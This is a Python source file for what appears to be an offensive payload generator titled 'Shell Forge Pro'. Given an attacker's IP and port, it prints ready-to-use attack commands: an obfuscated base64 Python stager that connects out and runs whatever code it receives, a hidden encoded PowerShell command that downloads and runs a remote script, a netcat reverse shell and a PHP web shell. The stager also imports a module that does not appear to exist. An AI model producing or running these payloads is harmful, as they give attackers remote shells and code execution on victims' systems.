import base64
import random
import string
from rich.console import Console
from rich.syntax import Syntax
from core.ui import draw_header

console = Console()


def generate_stager(lhost, lport):
    """Generates a polymorphic Python stager that executes in memory."""
    v_sock = ''.join(random.choices(string.ascii_lowercase, k=5))
    v_data = ''.join(random.choices(string.ascii_lowercase, k=5))

    # This stub connects, receives an encrypted payload, and executes it
    raw_python = f"""
import socket,os,memory_temp
{v_sock}=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
{v_sock}.connect(("{lhost}",{lport}))
{v_data}={v_sock}.recv(1024)
exec({v_data})
"""
    return base64.b64encode(raw_python.encode()).decode()


def generate_shell():
    draw_header("Shell Forge Pro: Multi-Stage")
    lhost = console.input("[bold yellow]LHOST (Your IP): [/bold yellow]")
    lport = console.input("[bold yellow]LPORT (Your Port): [/bold yellow]")

    if not lhost or not lport:
        return

    stager = generate_stager(lhost, lport)

    shells = {
        "Python Polymorphic Stager": f"python3 -c \"import base64;exec(base64.b64decode('{stager}'))\"",
        "PowerShell Obfuscated": f"powershell -NoP -NonI -W Hidden -Enc {base64.b64encode(f'IEX (New-Object Net.WebClient).DownloadString(\"http://{lhost}/p.ps1\")'.encode('utf-16le')).decode()}",
        "Netcat Traditional": f"nc {lhost} {lport} -e /bin/bash",
        "PHP Web-Shell Hook": f"<?php system($_GET['cmd']); ?>"
    }

    for name, code in shells.items():
        console.print(f"\n[bold cyan]--- {name} ---[/bold cyan]")
        console.print(Syntax(code, "bash", theme="monokai", word_wrap=True))

    input("\nPress Enter to return...")
